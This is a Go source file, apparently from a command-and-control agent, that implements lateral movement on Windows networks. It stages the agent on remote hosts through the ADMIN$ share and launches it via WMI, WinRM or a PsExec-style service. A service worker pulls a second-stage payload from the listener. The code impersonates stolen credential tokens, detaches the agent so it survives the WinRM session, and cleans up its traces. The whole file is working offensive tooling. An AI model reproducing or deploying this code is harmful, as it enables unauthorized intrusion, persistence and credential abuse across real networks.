//go:build windows

package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	procOpenSCManagerW     = advapi32.NewProc("OpenSCManagerW")
	procOpenServiceW       = advapi32.NewProc("OpenServiceW")
	procCreateServiceW     = advapi32.NewProc("CreateServiceW")
	procStartServiceW      = advapi32.NewProc("StartServiceW")
	procDeleteService      = advapi32.NewProc("DeleteService")
	procCloseServiceHandle = advapi32.NewProc("CloseServiceHandle")
	procQueryServiceStatus = advapi32.NewProc("QueryServiceStatus")
)

const (
	scManagerAllAccess = 0xF003F
	serviceAllAccess   = 0xF01FF
	serviceDemandStart = 3
	serviceErrorIgnore = 0
)

// runLateralChild is the --lateral-child entry point. The whole move runs
// here so the parent command loop only waits for a bounded child process.
// Failures are printed to standard output (exit 0) so the parent passes the
// explanation back to the operator as command output.
func runLateralChild(args []string) error {
	if len(args) != 2 || args[0] != "--lateral-child" {
		return errors.New("lateral child requires a JSON payload argument")
	}
	var payload lateralPayload
	if err := json.Unmarshal([]byte(args[1]), &payload); err != nil {
		return fmt.Errorf("decode lateral payload: %w", err)
	}
	result, err := lateralMove(payload)
	if err != nil {
		fmt.Println("Lateral failed: " + err.Error())
		return nil
	}
	fmt.Println(result)
	return nil
}

// lateralMove stages this agent binary on the target through the ADMIN$
// share and starts it with the requested execution method. Every network
// operation runs under the pinned worker's thread identity, which carries the
// active make_token credentials when one is set; without a token the move
// uses the agent's own identity and requires local admin rights on the
// target. The staged copy needs embedded connection settings (base URL and
// beacon secret) because a service process inherits no operator
// environment; build it with the server's use_server_config option.
func lateralMove(payload lateralPayload) (string, error) {
	return lateralMoveWithProgress(payload, nil)
}

// lateralMoveWithProgress publishes acknowledged artifacts before waiting on SCM.
func lateralMoveWithProgress(payload lateralPayload, publish func(string)) (string, error) {
	self, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("resolve agent executable: %w", err)
	}
	parent := os.Getenv("RMM_SESSION_ID")
	if parent == "" {
		parent = "go"
	}
	targetSession := payload.SessionID
	if targetSession == "" {
		targetSession = derivedSessionID(parent, "lateral")
	}
	serviceName, binaryName, err := lateralDeploymentNames(payload.RemoteName, rand.Reader)
	if err != nil {
		return "", err
	}
	localPath := `C:\Windows\System32\` + binaryName
	agentCommand := lateralAgentCommand(localPath, targetSession, payload.WorkspaceID, serviceName)

	if payload.Method == "psexec" {
		return lateralPsexecMove(payload, targetSession, serviceName, binaryName, publish)
	}

	// Stage the agent binary through ADMIN$ (SMB write under the active
	// identity), before requesting remote execution.
	sharePath := `\\` + payload.Host + `\ADMIN$\System32\` + binaryName
	if err := copyFile(self, sharePath); err != nil {
		return "", fmt.Errorf("stage agent on %s: %w", payload.Host, err)
	}

	switch payload.Method {
	case "wmiexec":
		if err := wmiCreateProcess(payload.Host, agentCommand); err != nil {
			return "", err
		}
	case "winrm":
		if err := winrmCreateProcess(payload.Host, localPath, targetSession, payload.WorkspaceID, serviceName, payload.winrmIdentity); err != nil {
			return "", err
		}
	}
	return fmt.Sprintf("lateral started: method=%s host=%s target session=%s",
		payload.Method, payload.Host, targetSession), nil
}

// lateralPsexecMove deploys the dedicated lateral service host the way
// RemCom and PsExec deploy their service: the compact binary is extracted
// from this agent's own body, staged on ADMIN$, and started as a
// demand-start service. Its linked stage1 worker fetches the masked stage2
// payload from the listener's staging endpoint, installs the agent, and
// stops. This caller then waits for successful service completion and
// removes the service and host binary itself; the server cleanup command
// is only a retry path when this immediate cleanup stays pending.
func lateralPsexecMove(payload lateralPayload, targetSession, serviceName, binaryName string, publish func(string)) (string, error) {
	startedAt := time.Now()
	cfg, err := loadConfig()
	if err != nil {
		return "", err
	}
	if !bytes.HasPrefix(embeddedLateralService, []byte("MZ")) {
		return "", errors.New("dedicated lateral service is not embedded: build the agent with MinGW through the server")
	}
	sharePath := `\\` + payload.Host + `\ADMIN$\System32\` + binaryName
	if err := os.WriteFile(sharePath, embeddedLateralService, 0700); err != nil {
		return "", fmt.Errorf("stage lateral service on %s: %w", payload.Host, err)
	}
	localPath := `C:\Windows\System32\` + binaryName
	binPath := buildWindowsCmdLine(append([]string{localPath}, lateralServiceArguments(payload.Stage, targetSession, cfg.BaseURL)...))
	// The service is not marked for deletion here; this caller removes it
	// below once the linked worker has completed successfully.
	if err := scmStartService(payload.Host, serviceName, binPath, false); err != nil {
		return "", err
	}
	ack := fmt.Sprintf("lateral started: method=psexec host=%s target session=%s service=%s binary=%s",
		payload.Host, targetSession, serviceName, binaryName)
	if publish != nil {
		publish(ack)
	}
	if err := waitStage1Stopped(payload.Host, serviceName, time.Duration(payload.TimeoutSeconds*float64(time.Second))-time.Since(startedAt)); err != nil {
		var failed *launcherFailure
		if errors.As(err, &failed) {
			cleanup, cleanupErr := lateralCleanup(lateralCleanupPayload{Host: payload.Host, ServiceName: serviceName, BinaryName: binaryName})
			if cleanupErr != nil {
				cleanup = "lateral cleanup pending: " + cleanupErr.Error()
			}
			return strings.Replace(ack, "lateral started:", "lateral failed:", 1) + "\n" + err.Error() + "\n" + cleanup, nil
		}
		return ack + "\nlateral cleanup pending: " + err.Error(), nil
	}
	cleanup, err := lateralCleanup(lateralCleanupPayload{Host: payload.Host, ServiceName: serviceName, BinaryName: binaryName})
	if err != nil {
		return ack + "\nlateral cleanup pending: " + err.Error(), nil
	}
	return ack + "\n" + cleanup, nil
}

// waitStage1Stopped observes only this deployment's service, never another agent.
// A successful service exit means stage1 created the new agent process.
func waitStage1Stopped(host, name string, timeout time.Duration) error {
	debugEvent("scm.wait_stopped.begin", nil)
	var machine *uint16
	if host != "" {
		pointer, err := syscall.UTF16PtrFromString(`\\` + host)
		if err != nil {
			return err
		}
		machine = pointer
	}
	debugEvent("scm.wait.open_manager.begin", nil)
	scm, _, callErr := procOpenSCManagerW.Call(uintptr(unsafe.Pointer(machine)), 0, 1)
	if scm == 0 {
		debugEvent("scm.wait.open_manager.failed", callErr)
		return fmt.Errorf("open SC manager on %s: %w", host, callErr)
	}
	debugEvent("scm.wait.open_manager.complete", nil)
	defer procCloseServiceHandle.Call(scm)
	serviceName, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		return err
	}
	debugEvent("scm.wait.open_service.begin", nil)
	service, _, callErr := procOpenServiceW.Call(scm, uintptr(unsafe.Pointer(serviceName)), 4)
	if service == 0 {
		debugEvent("scm.wait.open_service.failed", callErr)
		return serviceLookupOutcome(callErr)
	}
	debugEvent("scm.wait.open_service.complete", nil)
	defer procCloseServiceHandle.Call(service)
	deadline := time.Now().Add(timeout)
	for {
		var status struct{ serviceType, state, accepted, exitCode, specificCode, checkpoint, waitHint uint32 }
		debugEvent("scm.wait.query_status.begin", nil)
		ok, _, queryErr := procQueryServiceStatus.Call(service, uintptr(unsafe.Pointer(&status)))
		if ok == 0 {
			debugEvent("scm.wait.query_status.failed", queryErr)
			return fmt.Errorf("query launcher service: %w", queryErr)
		}
		debugEvent("scm.wait.query_status.complete", nil)
		ready, err := launcherServiceOutcome(status.state, status.exitCode, status.specificCode)
		if err != nil || ready {
			debugEvent("scm.wait_stopped.complete", err)
			return err
		}
		if !time.Now().Before(deadline) {
			debugEvent("scm.wait_stopped.timeout", context.DeadlineExceeded)
			return errors.New("launcher service has not stopped; cleanup pending")
		}
		time.Sleep(100 * time.Millisecond)
	}
}

// scmStartService creates and starts a service on the target host through
// the native SCM API. When markForDeletion is set the entry is marked for
// deletion immediately (removed once the process stops); the psexec module
// leaves the entry in place so the cleanup command owns its removal.
func scmStartService(host, serviceName, binPath string, markForDeletion bool) error {
	var machinePtr *uint16
	if host != "" {
		pointer, err := syscall.UTF16PtrFromString(`\\` + host)
		if err != nil {
			return fmt.Errorf("encode host: %w", err)
		}
		machinePtr = pointer
	}
	// Convert inside Call so Go retains the hostname for the native call.
	scm, _, callErr := procOpenSCManagerW.Call(uintptr(unsafe.Pointer(machinePtr)), 0, scManagerAllAccess)
	if scm == 0 {
		return fmt.Errorf("open SC manager on %s: %w", host, callErr)
	}
	defer procCloseServiceHandle.Call(scm)
	namePtr, err := syscall.UTF16PtrFromString(serviceName)
	if err != nil {
		return fmt.Errorf("encode service name: %w", err)
	}
	binPtr, err := syscall.UTF16PtrFromString(binPath)
	if err != nil {
		return fmt.Errorf("encode service binary: %w", err)
	}
	service, _, callErr := procCreateServiceW.Call(
		scm,
		uintptr(unsafe.Pointer(namePtr)),
		uintptr(unsafe.Pointer(namePtr)),
		serviceAllAccess,
		serviceWin32OwnProcess,
		serviceDemandStart,
		serviceErrorIgnore,
		uintptr(unsafe.Pointer(binPtr)),
		0, 0, 0, 0, 0, 0,
	)
	if service == 0 {
		return fmt.Errorf("create service on %s: %w", host, callErr)
	}
	defer procCloseServiceHandle.Call(service)
	started, _, callErr := procStartServiceW.Call(service, 0, 0)
	if markForDeletion {
		procDeleteService.Call(service)
	}
	if err := serviceStartOutcome(started != 0, callErr); err != nil {
		return fmt.Errorf("start service on %s: %w", host, err)
	}
	return nil
}

// scmDeleteService removes a service on the target host; a missing service
// is reported as already removed.
func scmDeleteService(host, serviceName string) (bool, error) {
	debugEvent("scm.delete.begin", nil)
	var machinePtr *uint16
	if host != "" {
		pointer, err := syscall.UTF16PtrFromString(`\\` + host)
		if err != nil {
			return false, fmt.Errorf("encode host: %w", err)
		}
		machinePtr = pointer
	}
	// Convert inside Call so Go retains the hostname for the native call.
	debugEvent("scm.delete.open_manager.begin", nil)
	scm, _, callErr := procOpenSCManagerW.Call(uintptr(unsafe.Pointer(machinePtr)), 0, scManagerAllAccess)
	if scm == 0 {
		debugEvent("scm.delete.open_manager.failed", callErr)
		return false, fmt.Errorf("open SC manager on %s: %w", host, callErr)
	}
	debugEvent("scm.delete.open_manager.complete", nil)
	defer func() {
		debugEvent("scm.delete.close_manager.begin", nil)
		ok, _, closeErr := procCloseServiceHandle.Call(scm)
		if ok == 0 {
			debugEvent("scm.delete.close_manager.failed", closeErr)
		} else {
			debugEvent("scm.delete.close_manager.complete", nil)
		}
	}()
	namePtr, err := syscall.UTF16PtrFromString(serviceName)
	if err != nil {
		return false, fmt.Errorf("encode service name: %w", err)
	}
	debugEvent("scm.delete.open_service.begin", nil)
	service, _, callErr := procOpenServiceW.Call(scm, uintptr(unsafe.Pointer(namePtr)), serviceAllAccess)
	if service == 0 {
		debugEvent("scm.delete.open_service.failed", callErr)
		return false, serviceLookupOutcome(callErr)
	}
	debugEvent("scm.delete.open_service.complete", nil)
	defer func() {
		debugEvent("scm.delete.close_service.begin", nil)
		ok, _, closeErr := procCloseServiceHandle.Call(service)
		if ok == 0 {
			debugEvent("scm.delete.close_service.failed", closeErr)
		} else {
			debugEvent("scm.delete.close_service.complete", nil)
		}
	}()
	debugEvent("scm.delete_service.begin", nil)
	deleted, _, callErr := procDeleteService.Call(service)
	if deleted == 0 {
		debugEvent("scm.delete_service.failed", callErr)
		return false, fmt.Errorf("delete service on %s: %w", host, callErr)
	}
	debugEvent("scm.delete_service.complete", nil)
	return true, nil
}

// runLateralDetach re-registers this copy as a local Windows service and
// exits. The WinRM shell terminates its command process tree when the shell
// closes; the SCM-started instance runs outside that job object and
// survives it. It runs under the identity WinRM authenticated on the target.
func runLateralDetach(args []string) error {
	startup, err := parseLateralStartup(args)
	if err != nil {
		return err
	}
	self, err := os.Executable()
	if err != nil {
		return fmt.Errorf("resolve agent executable: %w", err)
	}
	binPath := strings.Join(append([]string{self}, args...), " ")
	if err := scmStartService("", startup.ServiceName, binPath, true); err != nil {
		return fmt.Errorf("detach into the local service %s: %w", startup.ServiceName, err)
	}
	return nil
}

// runLateralCleanupChild is the --lateral-cleanup-child entry point: it
// removes the psexec deployment artifacts on the target. Failures print to
// standard output (exit 0) so the parent passes the explanation back.
func runLateralCleanupChild(args []string) error {
	if len(args) != 2 || args[0] != "--lateral-cleanup-child" {
		return errors.New("lateral cleanup child requires a JSON payload argument")
	}
	var payload lateralCleanupPayload
	if err := json.Unmarshal([]byte(args[1]), &payload); err != nil {
		return fmt.Errorf("decode lateral cleanup payload: %w", err)
	}
	result, err := lateralCleanup(payload)
	if err != nil {
		fmt.Println("Lateral cleanup failed: " + err.Error())
		return nil
	}
	fmt.Println(result)
	return nil
}

// lateralCleanup deletes the temporary launcher service and its host
// binary on the target. It first waits for the linked stage1 worker to
// finish, so a still-running deployment is never deleted underneath itself.
func lateralCleanup(payload lateralCleanupPayload) (string, error) {
	debugEvent("lateral.cleanup.begin", nil)
	if err := waitStage1Stopped(payload.Host, payload.ServiceName, 15*time.Second); err != nil {
		var failed *launcherFailure
		if !errors.As(err, &failed) {
			return "", err
		}
	}
	serviceDeleted, serviceErr := scmDeleteService(payload.Host, payload.ServiceName)
	debugEvent("lateral.cleanup.service_delete.returned", serviceErr)
	sharePath := `\\` + payload.Host + `\ADMIN$\System32\` + payload.BinaryName
	debugEvent("lateral.cleanup.remove_file.begin", nil)
	fileErr := removeStoppedLauncher(sharePath)
	debugEvent("lateral.cleanup.remove_file.returned", fileErr)
	var detail strings.Builder
	if serviceErr != nil {
		fmt.Fprintf(&detail, "service error (%v)", serviceErr)
	} else if serviceDeleted {
		detail.WriteString("service deleted")
	} else {
		detail.WriteString("service not found or already removed")
	}
	switch {
	case fileErr == nil:
		detail.WriteString("; launcher binary removed from ADMIN$")
	case os.IsNotExist(fileErr):
		detail.WriteString("; launcher binary not found on ADMIN$")
	default:
		fmt.Fprintf(&detail, "; launcher binary still on ADMIN$ (%v)", fileErr)
	}
	output, err := lateralCleanupOutcome(detail.String(), serviceErr, fileErr)
	debugEvent("lateral.cleanup.complete", err)
	if err == nil {
		lateralCleanupOwners.Lock()
		delete(lateralCleanupOwners.artifacts, payload)
		lateralCleanupOwners.Unlock()
	}
	return output, err
}

// removeStoppedLauncher tolerates the brief image-handle close after SCM stop.
func removeStoppedLauncher(path string) error {
	err := os.Remove(path)
	deadline := time.Now().Add(5 * time.Second)
	for (errors.Is(err, syscall.Errno(32)) || errors.Is(err, syscall.ERROR_ACCESS_DENIED)) && time.Now().Before(deadline) {
		time.Sleep(100 * time.Millisecond)
		err = os.Remove(path)
	}
	return err
}

// lateralThreadGoroutine runs lateral methods on a goroutine with a locked OS thread
// so ImpersonateLoggedOnUser applies the captured dispatch-time token to the
// ADMIN$ write and native execution calls. This avoids CreateProcessAsUserW and
// its SE_ASSIGNPRIMARYTOKEN_PRIVILEGE requirement: thread impersonation with a
// LOGON_NEW_CREDENTIALS token covers all outbound network auth without any
// special agent privileges.
//
// The goroutine's thread impersonation is independent of the main goroutine's
// thread token; the main goroutine's impersonation state is not affected.
func lateralThreadGoroutine(ctx context.Context, payload lateralPayload) (string, error) {
	return runLateralThread(ctx, payload, lateralMoveWithProgress)
}

// runLateralThread scopes impersonation to a pinned worker. The injected move
// supports local identity tests without remote execution.
func runLateralThread(ctx context.Context, payload lateralPayload, move func(lateralPayload, func(string)) (string, error)) (string, error) {
	return runLateralThreadWithCleanup(ctx, payload, move, clearLateralWorkerIdentity)
}

// clearLateralWorkerIdentity removes impersonation before thread reuse.
func clearLateralWorkerIdentity() error {
	if ok, _, err := procRevertToSelf.Call(); ok == 0 {
		return fmt.Errorf("clear worker thread token: %w", err)
	}
	return nil
}

// runLateralThreadWithCleanup keeps final completion behind identity cleanup;
// the cleanup seam permits failure and ordering tests without corrupting tokens.
func runLateralThreadWithCleanup(ctx context.Context, payload lateralPayload, move func(lateralPayload, func(string)) (string, error), clearIdentity func() error) (string, error) {
	if err := ctx.Err(); err != nil {
		return "", err
	}
	token, identity, err := captureLateralIdentity(payload.Method == "winrm")
	if err != nil {
		return "", err
	}
	payload.winrmIdentity = identity
	ch := make(chan lateralResult, 1)
	progress := make(chan string, 1)
	go func() {
		runtime.LockOSThread()
		result := lateralResult{}
		debugEvent("lateral.worker.start", nil)
		defer func() {
			debugEvent("lateral.worker.revert_identity.begin", nil)
			if identity != nil {
				*identity = winrmCredentials{}
			}
			err := clearIdentity()
			if token != 0 {
				_ = token.Close()
			}
			if err != nil {
				result.err = errors.Join(result.err, identityBoundaryFailure(err))
				result.result = ""
				ch <- result
				// Exiting while pinned makes the Go runtime discard this thread.
				return
			}
			debugEvent("lateral.worker.revert_identity.complete", nil)
			runtime.UnlockOSThread()
			debugEvent("lateral.worker.stop", nil)
			ch <- result
		}()
		// Use the dispatch-time token even if the main thread later replaces
		// or revokes its active token while this worker is starting.
		if token != 0 {
			if ok, _, err := procImpersonateLoggedOnUser.Call(uintptr(token)); ok == 0 {
				result.err = identityBoundaryFailure(fmt.Errorf("apply worker thread token: %w", err))
				return
			}
		}
		debugEvent("lateral.worker.apply_identity.returned", nil)
		if identityBoundaryFault.Load() {
			result.err = errIdentityUnsafe
			return
		}
		if err := ctx.Err(); err != nil {
			result.err = err
			return
		}
		result.result, result.err = move(payload, func(ack string) {
			rememberLateralCleanup(payload, ack)
			progress <- ack
		})
	}()
	return awaitLateralResult(ctx, ch, progress)
}

// captureLateralToken owns a duplicate of the dispatch-time token so replacing
// or closing the main thread's handle cannot change a queued worker's identity.
func captureLateralToken() (syscall.Token, error) {
	token, _, err := captureLateralIdentity(false)
	return token, err
}

// captureLateralIdentity captures token and optional WinRM credentials under
// one lock so an intervening make_token cannot mix identities between protocols.
func captureLateralIdentity(includeCredentials bool) (syscall.Token, *winrmCredentials, error) {
	tokenMu.Lock()
	defer tokenMu.Unlock()
	if identityBoundaryFault.Load() {
		return 0, nil, errIdentityUnsafe
	}
	if !tokenActive || activeToken == 0 {
		return 0, nil, nil
	}
	var handle syscall.Handle
	process := syscall.Handle(^uintptr(0))
	if err := syscall.DuplicateHandle(process, syscall.Handle(activeToken), process, &handle, 0, false, 2); err != nil {
		return 0, nil, fmt.Errorf("capture lateral worker token: %w", err)
	}
	var identity *winrmCredentials
	if includeCredentials {
		copy := spawnCredentials
		identity = &copy
	}
	return syscall.Token(handle), identity, nil
}
